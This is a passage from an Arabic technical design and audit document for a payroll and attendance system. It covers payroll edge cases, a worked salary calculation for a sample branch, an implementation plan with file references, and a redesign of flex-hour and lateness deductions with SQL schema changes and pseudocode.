| **ح٢-ب** | **حدود التصفية ضد المسير** | **ازدواج مؤكَّد بعد إصلاح ح٢:** التصفية بتاخد **كل** الأوفرتايم `APPROVED` بلا فلتر تاريخ (`offboarding.service.ts:302-304`) والمسير بياخد أوفرتايم الفترة (`payroll.service.ts:237-243`)؛ والتصفية بتخصم **كل** الأقساط غير المدفوعة (`offboarding.service.ts:327-334`) والمسير بيخصم قسط الفترة (`payroll.service.ts:315-321`) | حدود صريحة مكتوبة: **المسير** = أجر أيام العمل + خصومات الحضور + قسط الفترة + أوفرتايم الفترة. **التصفية** = مكافأة نهاية الخدمة + بدل الإجازات + **رصيد السلف بعد** استبعاد قسط المسير + الأوفرتايم اللي **مش** مطالَب به في أي مسير. تقنياً: التصفية تستثني أي `OvertimeEntry` أو `LoanInstallment` معرّفه موجود في `breakdown` لمسير حالته ∈ (CALCULATED, IN_REVIEW, APPROVED, PAID) |
| **ح٣** | **انتقل بين فرعين داخل الفترة** (الرياض → المعادي يوم 07-05) | `branchId` بيتكتب فوق القديم **بلا أي تاريخ** — مفيش جدول تعيينات في المشروع (تأكدت بالبحث: مفيش `employee_assignments`). النتيجة: يختفي من مسير الرياض بصمت، والمعادي يصرفله الشهر كامل، **وتكلفة الرياض بتطلع ناقصة 12 يوم** | كيان `employee_assignments` (تحت) · **قاعدة v1 (بسيطة وقابلة للشرح):** الفرع اللي هو فيه في `endDate` بياخد المسير كامل، ومركز التكلفة يتوزّع محاسبياً بس. **قاعدة v2:** تقسيم فعلي بين مسيرين — وساعتها المطالبة بتبقى «مطالبة أيام» مش «مطالبة فترة» |
| **ح٤** | **تعديل بيانات بعد الاعتماد** (زيادة راتب أُدخلت يوم 07-25) | البنود بتخزّن لقطة (`basicSalary`, `allowances` في `payroll.entities.ts:112-117`) فالمسير المعتمد **محمي فعلاً** ✅ — لكن الراتب على الموظف **مالوش تاريخ سريان** (`employee.entity.ts:202-220`)، فمحدش يعرف الزيادة من امتى | كيان `employee_salary_history(employeeId, basicSalary, allowances…, effectiveFrom, effectiveTo)` · المسير يقرا الراتب الساري في `endDate` · الزيادة بأثر رجعي داخل فترة **مصروفة** → **قيد فروقات** في المسير التالي، مش إعادة حساب |
| **ح٥** | **الموظف المستثنى من الحضور** (مدير/مندوب) | `materializeAbsences` بتجسّد غياب على أي يوم عمل بلا بصمة (`payroll.service.ts:259`) → **خصم كارثي** (شوف المثال: 12,466.67 من 17,000) | عمود `salaryMode: FIXED \| ATTENDANCE_BASED` على `Employee` · بيتخزن snapshot على العضوية · `FIXED` بيتخطّى تجسيد الغياب وكل خصومات الحضور (تفصيله في البند ⑨) |
| **ح٦** | **يوم البداية 29/30/31** | rollover في `new Date` بيكسر الفترة (شوف ١-٥) | `clampToMonth()` |
| **ح٧** | **موظف بلا راتب معرَّف** | `Number(undefined ?? 0) = 0` → بند بصافي صفر بلا أي تنبيه | استبعاد بسبب `NO_SALARY_DEFINED` + تحذير أحمر قبل الاعتماد |
| **ح٨** | **صافي سالب** | الطرح مباشر بلا أرضية (`payroll.service.ts:345-354`) → `netPay` سالب ممكن | أرضية `policy.minNetPercent` + ترحيل الفائض للمسير التالي كقيد مديونية |

```sql
-- كيان التعيينات — يحلّ ح٣ ويخلّي التقارير التاريخية صحيحة
CREATE TABLE employee_assignments (
  id            INT IDENTITY PRIMARY KEY,
  employeeId    INT  NOT NULL,
  branchId      INT  NOT NULL,
  departmentId  INT  NULL,
  teamId        INT  NULL,
  costCenterId  INT  NULL,
  fromDate      DATE NOT NULL,
  toDate        DATE NULL,          -- NULL = التعيين الحالي
  reason        NVARCHAR(200) NULL
);
CREATE INDEX IX_assign_emp_dates ON employee_assignments(employeeId, fromDate, toDate);

-- assignmentAt(empId, d) = الصف الوحيد اللي fromDate <= d AND (toDate IS NULL OR toDate >= d)
-- الهجرة (migration): صف واحد لكل موظف من قيم employees الحالية بـfromDate = joinDate
```

---

### ١-٨ مثال رقمي كامل — «مسير فرع الرياض – يوليو 2026»

#### تعريف المسير
```json
{
  "code": "PR-RYD-2026-07",
  "name": "مسير فرع الرياض – يوليو 2026",
  "scopeType": "BRANCH",
  "scopeIds": [3],
  "includeEmployeeIds": [],
  "excludeEmployeeIds": [107],
  "policyId": 1,
  "periodMode": "CYCLE",
  "period": "2026-07",
  "startDate": "2026-06-23",
  "endDate":   "2026-07-22",
  "payableDaysBasis": "FIXED_30",
  "monthlyDaysSnapshot": 30
}
```
```
periodDays  = DATEDIFF('2026-06-23','2026-07-22') + 1 = 8 (يونيو) + 22 (يوليو) = 30 يوم
workingDays = 30 − 8 (٤ جمعة + ٤ سبت) = 22 يوم عمل
divisorDays = 30   (FIXED_30)
```

#### حلّ النطاق — ٧ مرشحين، ٥ داخل المسير

| # | الكود | الاسم | القرار | السبب | coverFrom → coverTo | أيام | معامل |
|---|---|---|---|---|---|---|---|
| 1 | E-101 | أحمد | **INCLUDED** | نطاق الفرع | 06-23 → 07-22 | 30 | 1.000000 |
| 2 | E-102 | سارة | **INCLUDED** | نطاق الفرع | **07-01** → 07-22 | 22 | 0.733333 |
| 3 | E-103 | خالد | **INCLUDED** | نطاق الفرع | 06-23 → **07-10** | 18 | 0.600000 |
| 4 | E-104 | عمر | **INCLUDED** | نطاق الفرع | 06-23 → 07-22 | 30 | 1.000000 |
| 5 | E-105 | هدى | **INCLUDED** | نطاق الفرع · `salaryMode=FIXED` | 06-23 → 07-22 | 30 | 1.000000 |
| 6 | E-106 | منى | `EXCLUDED` | `TRANSFERRED_OUT` — انتقلت للمعادي 07-05، تعيينها في `endDate` = المعادي | — | — | — |
| 7 | E-107 | نورة | `EXCLUDED` | `MANUAL_EXCLUDE` — «مسير الإدارة العليا» | — | — | — |

#### تفصيل الحساب

**E-101 أحمد — الحالة العادية**
```
أساسي 8,000 + سكن 800 + انتقال 200            → gross = 9,000.00
dayRate = 9,000 / 30 = 300.00 · hourRate = 300/8 = 37.50 · minuteRate = 0.625
معامل التناسب 1.000                            → grossEarned = 9,000.00
تأخير: يومان × 75 دقيقة → شريحة (61–120 د) FRACTION 0.25 يوم
       2 × 0.25 × 300.00                       = (−) 150.00
أوفرتايم معتمد: 6 ساعات × مُضاعِف 1.5 × 37.50   = (+) 337.50
─────────────────────────────────────────────────────────────
netPay = 9,000.00 + 337.50 − 150.00           = 9,187.50
```

**E-102 سارة — انضمّت داخل الفترة (ح١)**
```
أساسي 6,000 + بدلات 1,000                      → gross = 7,000.00
dayRate = 7,000 / 30 = 233.33      ← من الإجمالي الكامل، لا المتناسب
معامل التناسب = 22/30 = 0.733333
grossEarned = 7,000.00 × 0.733333             = 5,133.33
غياب يوم واحد بلا إذن × معامل 1.0 × 233.33     = (−) 233.33
─────────────────────────────────────────────────────────────
netPay                                         = 4,900.00
```

**E-103 خالد — انتهت خدمته داخل الفترة (ح٢)**
```
أساسي 12,000 + بدلات 0                         → gross = 12,000.00
dayRate = 12,000 / 30 = 400.00
coverTo = lastWorkingDay = 2026-07-10 → 18 يوم · معامل = 0.600000
grossEarned = 12,000.00 × 0.600000            = 7,200.00
قسط سلفة مستحق 2026-07-01                      = (−) 1,000.00
─────────────────────────────────────────────────────────────
netPay (من المسير)                             = 6,200.00

⚠ حدود التصفية (ح٢-ب): مكافأة نهاية الخدمة وبدل الإجازات تُصرف من ملف
   الـoffboarding — و«رصيد السلف المتبقي» هناك لازم يستثني الـ1,000 دي.
```

**E-104 عمر — خصومات متعددة**
```
أساسي 5,000 + سكن 500                          → gross = 5,500.00
dayRate = 5,500 / 30 = 183.33
غياب يومان بلا إذن × معامل 1.5 × 183.33        = (−) 550.00
إجازة بدون راتب نصف يوم × 183.33               = (−)  91.67
خصم إداري (دفتر المديونيات — DEBIT)            = (−) 300.00
─────────────────────────────────────────────────────────────
netPay                                         = 4,558.33
```

**E-105 هدى — مستثناة من الحضور (ح٥ / البند ⑨)**
```
أساسي 15,000 + بدلات 2,000                     → gross = 17,000.00
salaryMode = FIXED → مفيش تجسيد غياب، مفيش خصم تأخير، مفيش خصم غياب
─────────────────────────────────────────────────────────────
netPay                                         = 17,000.00
```

#### إجمالي المسير

| الكود | الاسم | الإجمالي | المستحق بالتناسب | الاستحقاقات | الخصومات | **الصافي** |
|---|---|---:|---:|---:|---:|---:|
| E-101 | أحمد | 9,000.00 | 9,000.00 | 337.50 | 150.00 | **9,187.50** |
| E-102 | سارة | 7,000.00 | 5,133.33 | 0.00 | 233.33 | **4,900.00** |
| E-103 | خالد | 12,000.00 | 7,200.00 | 0.00 | 1,000.00 | **6,200.00** |
| E-104 | عمر | 5,500.00 | 5,500.00 | 0.00 | 941.67 | **4,558.33** |
| E-105 | هدى | 17,000.00 | 17,000.00 | 0.00 | 0.00 | **17,000.00** |
| | **الإجمالي (5 موظفين)** | 50,500.00 | 43,833.33 | 337.50 | 2,325.00 | **41,845.83** |

#### مقارنة: نفس المدخلات على النظام كما هو النهاردة

| الموظف | النظام الحالي | التصميم الصحيح | الفرق | السبب بالدليل |
|---|---:|---:|---:|---|
| أحمد | 9,187.50 | 9,187.50 | 0.00 | مفيش حالة حدّية ✅ |
| سارة | 6,766.67 | 4,900.00 | **+1,866.67 صرف زائد** | مفيش تناسب — `payroll.service.ts:231` |
| خالد | **0.00** | 6,200.00 | **−6,200.00 حق ضائع** | `isActive:true` (`payroll.service.ts:110`) بعد `finalize` (`offboarding.service.ts:481-482`) |
| عمر | 4,558.33 | 4,558.33 | 0.00 | ✅ |
| هدى | 4,533.33 | 17,000.00 | **−12,466.67 خصم باطل** | 22 يوم عمل تجسّدوا غياباً — `payroll.service.ts:259, 284-286` |
| **الإجمالي** | **25,045.83** | **41,845.83** | **16,800.00** | — |
| منى (E-106) | تختفي بصمت من الرياض | مستبعدة **بسبب مسجَّل** | تكلفة 12 يوم على مركز التكلفة الغلط | مفيش `employee_assignments` |
| نورة (E-107) | **مستحيل استبعادها** | مستبعدة بـ`MANUAL_EXCLUDE` | — | مفيش `excludeEmployeeIds` |

> **الخلاصة:** خطأ بقيمة **16,800 ريال في مسير من ٥ موظفين واحد** — تلاتة منهم بس عليهم حالة حدّية. على فرع بـ50 موظف، الأرقام دي بتتضاعف خطّياً.

---

### ١-٩ ترتيب التنفيذ للمبرمج

| # | العمل | الملف | لماذا هنا |
|---|---|---|---|
| 1 | استبدل `isActive:true` بـ`employedInPeriod` + احسب `coverFrom/coverTo/coverDays` | `payroll.service.ts:104-136` | يوقف نزيف حق الموظف المنتهي (**CRITICAL**) |
| 2 | طبّق `prorationFactor` على الإجمالي | `payroll.service.ts:225-231` | يوقف الصرف الزائد للمنضم حديثاً (**CRITICAL**) |
| 3 | `salaryMode` على `Employee` + تخطّي الحضور | `employee.entity.ts` · `payroll.service.ts:259, 269-286` | يوقف الخصم الباطل (**CRITICAL**) |
| 4 | وسّع `PayrollRunMember` (حالة + سبب + تغطية + لقطات) واقرأها | `payroll.entities.ts:82-95` · `payroll.service.ts:217-221` | أساس الحارس والتقارير |
| 5 | الحارس ضد الازدواج — الاستعلام + `payroll_period_claims` | `payroll.service.ts` (قبل `:217`) و`approve():405` | يمنع الصرف مرتين (**CRITICAL**) |
| 6 | `excludeEmployeeIds` / `includeEmployeeIds` + `POST /runs/preview-scope` | `payroll.entities.ts` · `payroll.controller.ts:34-60` | البند ① الحالة الحاسمة |
| 7 | `periodMode` + `startDate/endDate` في الـDTO + `clampToMonth()` + `policyId` (ناقص من الـDTO حالياً) | `payroll.controller.ts:34-60` · `payroll.service.ts:89-101` | البند ② |
| 8 | `payableDaysBasis` + `monthlyDaysSnapshot` على المسير | `payroll.entities.ts` · `payroll.service.ts:197, 232` | تجميد الأساس ضد تغيير الإعدادات |
| 9 | `IN_REVIEW` + `CANCELLED` + `reopen()` + `reversePay()` + `payroll_run_events` | `payroll.entities.ts:12` · `payroll.service.ts:405-454` | مخرج من المسير المصروف بالغلط |
| 10 | إصلاح `list()` — نطاق الفرع من الأعضاء لا من `run.branchId` | `payroll.service.ts:457-461` | المسيرات غير الفرعية مش ظاهرة لحد |
| 11 | dedup لكل الأنواع لا `BRANCH` بس | `payroll.service.ts:166-170` | مسيرات مكرّرة |
| 12 | `employee_assignments` + `assignmentAt()` | كيان جديد | ح٣ — التكلفة التاريخية |
| 13 | `employee_salary_history` + قراءة الراتب الساري في `endDate` | كيان جديد | ح٤ |
| 14 | حدود المسير/التصفية (استثناء الأوفرتايم والأقساط المطالَب بها) | `offboarding.service.ts:302-304, 327-334` | ح٢-ب — ازدواج بعد إصلاح #1 |
| 15 | الشاشة: `calculateDefined` في `src/lib/api.ts` + معاينة النطاق + تفعيل الفترة المخصّصة | `src/lib/api.ts:416` · `src/app/payroll/page.tsx:142, 378-403` | من غيرها كل اللي فوق غير مستخدَم |
| 16 | تقرير «موظفون بلا مسير في الفترة» | جديد | التوأم الضروري للحارس |

---

## ٢) الساعة المرنة وشرائح خصم التأخير

هذا القسم يغطي بندَي ④ و⑤ من المواصفة. البندان مترابطان: **الساعة المرنة** هي اللي بتقرّر *هل فيه تأخير أصلاً وكام دقيقة*، و**الشرائح** هي اللي بتقرّر *الدقايق دي تتحوّل لفلوس إزاي*. لو الأول غلط، التاني بيخصم رقم غلط بدقّة عالية.

---

### أ) الساعة المرنة (Flex Window)

#### أ-١) المطلوب حرفياً — القواعد الأربع

الوردية: بداية `S = 09:00`، نهاية `E = 18:00`، نافذة مرنة `[F=09:00 → W=10:00]`، ساعات مطلوبة `R = 9 ساعات (540 دقيقة)`.

| # | الحالة | النتيجة المطلوبة | التأخير (lateMinutes) | النقص (shortfallMinutes) |
|---|---|---|---|---|
| **١** | حضر داخل النافذة **وأكمل** الساعات | حاضر — **لا خصم** | 0 | 0 |
| **٢** | حضر داخل النافذة **ولم يكمل** | خصم **بالنقص** — **مش بالشرائح** | 0 | `R − العمل الفعلي` |
| **٣** | حضر **بعد** النافذة (10:01) | **متأخر يُقاس من بداية الوردية 09:00 ⇒ 61 دقيقة**، وتُطبَّق **الشرائح** حتى لو أكمل الـ9 ساعات | `وقت البصمة − S = 61` | حسب سياسة التداخل (أ-٧) |
| **٤** | حضر **قبل** بداية الوردية (08:30) | لا تأخير · والوقت الزائد **لا يُحتسب إضافي** إلا بمسار الأوفرتايم | 0 | `max(0, R − العمل)` |

> **الجوهر في القاعدة ٣:** القياس **من `S` مش من `W`**. لو قِسنا من نهاية النافذة كان الرقم دقيقة واحدة بدل 61، وكان سقط في «لا شريحة» بدل شريحة الساعة–الساعتين. الفرق المالي في المثال أدناه: **صفر تقريباً مقابل 57.19 ريال في اليوم الواحد**.

#### أ-٢) الحالة عندنا الآن (بالدليل)

| البند | الحالة | الدليل |
|---|---|---|
| `shiftMode: fixed\|flexible` + `requiredHours` على الوردية | **موجود** | `api/src/assets/assets.entities.ts:90-95` |
| **نافذة الحضور المرنة (09→10)** | **غير موجود — لا حقل ولا منطق** | لا يوجد أي عمود؛ فرع المرنة `api/src/attendance/attendance.service.ts:1082-1101` **لا يقرأ `checkIn` مقابل أي نافذة إطلاقاً** — يقرأه فقط ليطرحه من `checkOut` (سطر 1094) |
| القاعدة ١ (أكمل → لا خصم) | **موجود** | `attendance.service.ts:1096-1098` |
| القاعدة ٢ (نقص → خصم) | **موجود شكلاً، خاطئ مسارًا** | النقص يُكتب في **عمود التأخير** `lateMinutes` (سطر 1097) فيمرّ على الشرائح في `payroll.service.ts:274` — أي يُعامَل معاملة «متأخر» |
| القاعدة ٣ (بعد النافذة) | **غير موجود** | `lateRaw = toMinutes(checkIn) − shiftStart` موجود **حصراً في فرع `fixed`** (`attendance.service.ts:1105`). في المرنة، من حضر 10:01 وأكمل ساعاته ⇒ `deficit = 540−540 = 0` ⇒ `lateMinutes = 0` ⇒ **`status='present'` بلا خصم**. وكذلك من بدأ 13:00 وخرج 22:00 |
| القاعدة ٤ (قبل البداية) | **موجود ضمناً** | لا يُقاس التأخير أصلاً؛ والحضور المبكر لا يُحتسب أوفرتايم (`attendance.service.ts:1205-1208`: `checkOut − shiftEnd` فقط) |
| نوافذ `checkinFrom/checkinTo` | **موجودة لكنها ليست نافذة سماح** | `assets.entities.ts:105-117` — دي **نافذة تصنيف البصمة** (أيها دخول وأيها خروج)، `attendance.service.ts:941-958`، ومقيَّدة بـ`hasWindows` اللي يشترط النوافذ الأربع معاً وإلا يسقط التصنيف كله. **ممنوع إعادة استخدامها** كنافذة مرونة |
| `deductibleMinutes` (إذن بخصم) في المرنة | **صفر دائماً** | يُملأ في فرع `fixed` فقط (`attendance.service.ts:1138`) |
| الوردية المرنة الليلية | **مكسورة** | `workMinutes = checkOut − checkIn` بلا لفّ منتصف ليل (سطر 1094)، والبصمات تُستعلم داخل اليوم التقويمي فقط (`attendance.service.ts:904-909`) |

#### أ-٣) التصميم المقترح — حقول الوردية

```sql
ALTER TABLE shifts ADD
  flexEnabled            BIT           NOT NULL DEFAULT 0,   -- التفعيل لكل وردية
  flexFrom               VARCHAR(5)    NULL,                 -- HH:mm — NULL ⇒ = startTime
  flexTo                 VARCHAR(5)    NULL,                 -- HH:mm — نهاية نافذة الحضور
  shortfallGraceMinutes  INT           NULL,                 -- سماح النقص — NULL ⇒ graceMinutes
  flexWindowSupersedesGrace BIT        NOT NULL DEFAULT 1;   -- النافذة تُلغي سماح التأخير
-- requiredHours موجود بالفعل: assets.entities.ts:94-95
```

| الحقل | النوع | المعنى | الافتراضي |
|---|---|---|---|
| `flexEnabled` | bool | تفعيل الساعة المرنة **لهذه الوردية** (بند ④ حرفياً: خيار على مستوى الوردية) | `false` |
| `flexFrom` | HH:mm | بداية النافذة | `startTime` |
| `flexTo` | HH:mm | نهاية النافذة — بعدها = متأخر | مطلوب لو `flexEnabled` |
| `requiredHours` | decimal(4,2) | الساعات الواجب إكمالها (9.00) | مدة الوردية |
| `shortfallGraceMinutes` | int | سماح النقص (منفصل عن سماح التأخير) | `graceMinutes` |
| `flexWindowSupersedesGrace` | bool | لو `true`: **لا يُطبَّق `graceMinutes` على التأخير بعد النافذة** — لأن النافذة **هي** السماح، وتطبيق الاثنين = تسامح مزدوج | `true` |

**تحقّقات الحفظ:** `flexEnabled=1` ⇒ `flexTo` مطلوب · `flexFrom ≥ startTime` · `flexTo > flexFrom` · `flexTo` داخل الوردية · `requiredHours ≤ مدة الوردية + الأوفرتايم المسموح`.

**ليه حقول جديدة ومش `checkinFrom/To`؟** لأن دول محجوزين لتصنيف البصمة وسلوكهم مقيَّد بشرط `hasWindows` (النوافذ الأربع معاً) — لو ضبطنا نافذة المرونة عليهم هننكسر التصنيف كله، ولو ضبطناهم كلهم هنغيّر معنى «أي بصمة دي دخول» بدون قصد.

#### أ-٤) الفصل الدلالي الحرج — «التأخير» ≠ «النقص»

**المشكلة اليوم:** العمود `lateMinutes` (`attendance.entities.ts:179-180`) بيحمل معنيين متناقضين:
- في `fixed` (سطر 1115): **تأخير زمني** بالدقائق من بداية الوردية.
- في `flexible` (سطر 1097): **نقص في الساعات**، لا علاقة له بالتوقيت.

**ليه ده قاتل؟** لأن المواصفة في القاعدة ٣ بتطلب حالة يجتمع فيها **الاتنين على نفس اليوم**: «متأخر 61 دقيقة **وأكمل ساعاته**» — وحقل واحد ما يقدرش يعبّر عن `(61, 0)` ولا عن `(61, 75)`. والنتيجة العملية الحالية أسوأ: نقص 4 ساعات في وردية مرنة بيمرّ على `latenessForDay(240, ...)` (`payroll.service.ts:274`) فيتعامل معاه كأنه «متأخر 240 دقيقة» ويقع في أعلى شريحة عقوبة.

**الحل — حقلان منفصلان + سياستان مختلفتان:**

```sql
ALTER TABLE attendance_days ADD
  shortfallMinutes  INT          NOT NULL DEFAULT 0,
  flexOutcome       VARCHAR(20)  NULL,   -- IN_WINDOW_OK | IN_WINDOW_SHORT | AFTER_WINDOW | BEFORE_START
  missingCheckout   BIT          NOT NULL DEFAULT 0;
-- lateMinutes يعود لمعناه الوحيد: تأخير زمني بالدقائق من بداية الوردية
```

| الحقل | المعنى الوحيد | يُملأ في | سياسة الخصم في المسير |
|---|---|---|---|
| `lateMinutes` | **دقائق تأخير زمني** من `shiftStart` بعد التعذير | `fixed` دائماً · `flexible` **فقط** عند `AFTER_WINDOW` | **شرائح التأخير** (عقوبة تصاعدية) |
| `shortfallMinutes` | **دقائق نقص** عن `requiredHours` | `flexible` فقط | **معالج مستقل** — افتراضياً 1:1 بسعر الدقيقة (استرداد قيمة عمل لم يُؤدَّ، **مش عقوبة**) |
| `earlyLeaveMinutes` | انصراف مبكر | `fixed` فقط | سياسة مستقلة (**حالياً يُحسب ولا يُخصم إطلاقاً** — `payroll.service.ts:263-279`) |
| `deductibleMinutes` | دقائق إذن «بخصم» | `fixed` فقط اليوم — **يجب تعبئتها في المرنة كمان** | × سعر الدقيقة مباشرة، **خارج الشرائح** (`payroll.service.ts:275`) |
| `flexOutcome` | سبب القرار — للتدقيق والقسيمة | `flexible` | لا خصم — بس بيخلّي الرقم قابل للشرح للموظف |

**الفرق الفلسفي اللي يبرّر الفصل:** التأخير **مخالفة انضباط** فيتصاعد خصمها (ساعة تتخصم بساعة ونصف). النقص **عمل لم يُؤدَّ** فيُسترد بقيمته الفعلية 1:1. خلطهما بيخلّي اللي اشتغل 5 ساعات بدل 9 (نقص 240 د) يتعاقب كأنه وصل الساعة 1 ظهراً — وده لا المواصفة طلبته ولا العدل.

#### أ-٥) جدول القرار والخوارزمية

```
المدخلات (اليوم عمل، الوردية مرنة، فيه بصمة دخول):
  S  = shiftStart                     (دقائق من منتصف الليل)
  F  = flexFrom  ?? S
  W  = flexTo
  A  = وقت بصمة الدخول
  R0 = requiredHours × 60
  EX = الدقائق المعذورة داخل الوردية (إذن مجاني + إجازة جزئية)
  R  = max(0, R0 − EX)                 ← المطلوب الفعلي بعد التعذير
  D  = مدة العمل الفعلية (بلفّ منتصف الليل)
  G  = graceMinutes            (سماح التأخير)
  Gs = shortfallGraceMinutes   (سماح النقص)

── القرار ───────────────────────────────────────────────────────────
if (النافذة مغطاة بالكامل بإذن/إجازة معذورة)      → flexOutcome = IN_WINDOW_OK   ← قاعدة الإلغاء (أ-٨/٣)
     late = 0 ; short = shortfallOf(R, D)

else if (A < F)                                    → BEFORE_START      ← القاعدة ٤
     late = 0 ; short = shortfallOf(R, D)

else if (A <= W)                                   → IN_WINDOW_*       ← القاعدتان ١ و٢
     late = 0 ; short = shortfallOf(R, D)
     flexOutcome = short > 0 ? IN_WINDOW_SHORT : IN_WINDOW_OK

else  /* A > W */                                  → AFTER_WINDOW      ← القاعدة ٣
     lateRaw  = A − S                                   ← من بداية الوردية، مش من W
     excused  = دقائق [S, A] المغطاة بإذن مجاني/إجازة صباحية
     covered  = دقائق [S, A] المغطاة بإذن «بخصم»   (تُعفى من التأخير وتُخصم بالدقيقة)
     eff      = lateRaw − excused − covered
     late     = flexWindowSupersedesGrace ? max(0, eff) : (eff > G ? eff : 0)
     short    = shortfallOf(R, D) وفق سياسة التداخل (أ-٧)

shortfallOf(R, D):
     if (!checkOut)  → missingCheckout = 1 ; return حسب missingCheckoutPolicy
     def = R − D
     return def > Gs ? def : 0

status = late > 0 ? 'late' : short > 0 ? 'shortfall' : hasHalfLeave ? 'partial_leave' : 'present'
```

> **ملاحظة تنفيذ حاسمة:** حساب `late` **لا يعتمد على `checkOut` إطلاقاً** — كل اللي محتاجه بصمة الدخول. ده يصلّح خللاً حالياً: `attendance.service.ts:1099-1101` بترجع `status='present'` بأصفار لو مافيش بصمة خروج، فاللي حضر 13:00 ونسي البصم خارجاً **بيمرّ نظيفاً**.

#### أ-٦) أمثلة رقمية — موظف راتبه 9000

```
gross      = 9000                                  (أساسي + بدلات — payroll.service.ts:231)
dayRate    = 9000 / payroll.monthly_days (30)      = 300.000 ريال/يوم
hourRate   = 300  / payroll.daily_hours  (8)       =  37.500 ريال/ساعة
minuteRate = 37.5 / 60                             =   0.625 ريال/دقيقة
```

الوردية: `09:00–18:00` · مرنة · نافذة `09:00→10:00` · `requiredHours = 9` · شرائح الفقرة (ب-٥).

| # | السيناريو | البصمات | `flexOutcome` | `late` | `short` | الخصم |
|---|---|---|---|---|---|---|
| ١ | داخل النافذة وأكمل | 09:40 → 18:40 (540 د) | `IN_WINDOW_OK` | 0 | 0 | **0.00** |
| ٢ | داخل النافذة ولم يكمل | 09:45 → 17:30 (465 د) | `IN_WINDOW_SHORT` | 0 | **75** | **46.88** = 75 × 0.625 |
| ٣ | **بعد النافذة وأكمل ساعاته** | 10:01 → 19:01 (540 د) | `AFTER_WINDOW` | **61** | 0 | **57.19** = 61 × **1.5** × 0.625 |
| ٤ | قبل البداية | 08:30 → 17:30 (540 د) | `BEFORE_START` | 0 | 0 | **0.00** |
| ٥ | بعد النافذة بكتير | 11:30 → 20:30 (540 د) | `AFTER_WINDOW` | **150** | 0 | **187.50** = 150 × **2** × 0.625 |

**السيناريو ٢ — الفرق بين الصح والغلط (وده اللي بيحصل عندنا دلوقتي):**

| المعالجة | الحساب | النتيجة |
|---|---|---|
| **الصحيحة** (معالج نقص 1:1) | 75 × 0.625 | **46.88** |
| الحالية — النقص يمرّ على الشرائح كـ«تأخير» بمضاعف 1.5 | 75 × 1.5 × 0.625 | 70.31 (**+50%**) |
| الحالية — والشريحة كسر يوم 0.25 | 0.25 × 300 | 75.00 (**+60%**) |

**السيناريو ٣ — الفرق بين وجود النافذة وعدمها:**

| النظام | الناتج |
|---|---|
| النظام الحالي (`attendance.service.ts:1096-1098`) | `deficit = 540−540 = 0` ⇒ `late=0` ⇒ `present` ⇒ **خصم 0.00** |
| التصميم المقترح | `late = 61` ⇒ شريحة [60,120) بمضاعف 1.5 ⇒ **57.19** |
| لو قِسنا (خطأً) من نهاية النافذة | `1` دقيقة ⇒ تحت السماح ⇒ **0.00** |

**قاعدة سعر الساعة — تحذير:** الوردية مطلوب فيها **9 ساعات** بينما `payroll.daily_hours = 8` (`payroll.service.ts:198`)، فالدقيقة تُسعَّر بـ1/8 اليوم مش 1/9. أضِف على السياسة `hourRateBasis: CONFIG_DAILY_HOURS | SHIFT_REQUIRED_HOURS`:

| الأساس | `hourRate` | `minuteRate` | خصم السيناريو ٣ |
|---|---|---|---|
| `CONFIG_DAILY_HOURS` = 8 (الحالي) | 37.50 | 0.6250 | **57.19** |
| `SHIFT_REQUIRED_HOURS` = 9 | 33.33 | 0.5556 | **50.83** |

فرق 6.36 ريال في اليوم الواحد = ~140 ريال شهرياً لموظف واحد. لازم يكون قرار صريح مش أثراً جانبياً.

#### أ-٧) ازدواج الخصم في القاعدة ٣ — أخطر فخّ حسابي

لو الموظف حضر 10:01 وانصرف 18:00 (نهاية الوردية عادي): `late = 61` و `D = 479` ⇒ `short = 540 − 479 = 61`. **نفس الـ61 دقيقة** اتحسبت مرتين.

أضِف على السياسة `afterWindowOverlap`:

| القيمة | القاعدة | الحساب (10:01→18:00) | النتيجة | الحكم |
|---|---|---|---|---|
| `BOTH_FULL` | الاتنين كاملين | 57.19 + (61 × 0.625) | **95.31** | ظلم — 61 دقيقة قيمتها 38.13 خُصمت 2.5× |
| `LATE_ONLY` | التأخير بس | 57.19 | **57.19** | يسقط النقص الحقيقي في الحالات الأكبر |
| **`SUBTRACT_LATE`** ✅ | `short = max(0, R − D − late)` | 57.19 + (max(0, 61−61) × 0.625) | **57.19** | صحيح |

**الحالة اللي بتفرّق:** حضر 10:01 وانصرف 16:00 ⇒ `D = 359` ⇒ `short الخام = 181`.

| القيمة | الحساب | النتيجة |
|---|---|---|
| `BOTH_FULL` | 57.19 + 181 × 0.625 | 170.31 |
| `LATE_ONLY` | 57.19 | 57.19 (**ضاع 120 دقيقة عمل لم تُؤدَّ**) |
| **`SUBTRACT_LATE`** ✅ | 57.19 + (181−61) × 0.625 = 57.19 + 75.00 | **132.19** |

الافتراضي الموصى به: `SUBTRACT_LATE` — التأخير يتعاقب بالشرائح، وما زاد عنه من نقص يُسترد 1:1، وكل دقيقة تُحسب **مرة واحدة**.

**سقف يومي إلزامي:** `خصم اليوم (تأخير + نقص) ≤ dayRate`. مثال يوضّح لزومه: تأخير 300 دقيقة بمضاعف 2 ⇒ 300 × 2 × 0.625 = **375 ريال** > قيمة اليوم 300. بلا سقف، **يوم واحد بيخصم أكتر من أجره** — والموظف اللي غاب بالكامل يتخصم 300 بس (`payroll.service.ts:286`)، فيبقى **الغياب أرخص من التأخير**، وهي حافز عكسي مدمّر.

#### أ-٨) الحالات الحدّية

**١) وردية ليلية عابرة لمنتصف الليل** — `22:00 → 07:00`، نافذة `22:00→23:00`، `R = 540`.

```
البصمات: دخول 23:30 (يوم D) · خروج 07:15 (يوم D+1)
S = 1320 (22:00) · W = 1380 (23:00) · A = 1410 (23:30)  ⇒ A > W ⇒ AFTER_WINDOW
late = 1410 − 1320 = 90 د  ⇒ شريحة [60,120) × 1.5 ⇒ 90 × 1.5 × 0.625 = 84.38
D    = (1440 + 435) − 1410 = 465 د        ← لفّ منتصف الليل إلزامي
short(SUBTRACT_LATE) = max(0, 540 − 465 − 90) = 0
الإجمالي = 84.38
```

**العطبان اللي لازم يتصلّحوا الأول:**
- `attendance.service.ts:904-909` — البصمات تُستعلم في `[date 00:00, date 23:59]` فقط ⇒ **بصمة الخروج 07:15 مش هتتقرأ أصلاً**. الإصلاح: نافذة استعلام مرتكزة على الوردية `[shiftStart − lookback, shiftStart + duration + lookahead]` تعبر التاريخين، ونسبة اليوم للـ**تاريخ بداية الوردية**.
- `attendance.service.ts:1094, 1133` — `workMinutes = checkOut − checkIn` بلا لفّ ⇒ `435 − 1410 = −975` ⇒ `max(0, ...) = 0` ⇒ نقص = المطلوب كامل (540 د) ⇒ خصم يوم كامل لموظف داوم 7 ساعات و45 دقيقة. **يمسّ `fixed` كمان.**
